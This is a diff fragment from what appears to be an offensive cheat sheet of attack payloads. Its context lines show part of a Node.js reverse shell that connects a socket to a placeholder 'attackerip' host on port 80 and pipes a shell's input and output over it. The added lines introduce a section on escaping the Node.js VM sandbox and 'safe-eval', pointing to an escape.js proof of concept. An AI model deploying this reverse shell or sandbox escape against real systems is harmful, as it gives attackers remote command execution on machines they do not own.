@@ -28,3 +28,7 @@ var client = new net.Socket();
 client.connect(80, "attackerip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
 sh.stderr.pipe(client);});
 ```
+
+### Escaping NodeJS VM (sandbox)
+
+- Escaping NodeJS VM or `safe-eval` is possible, see - and [escape.js](/vulnerable-code-examples/js/escape.js) for PoC
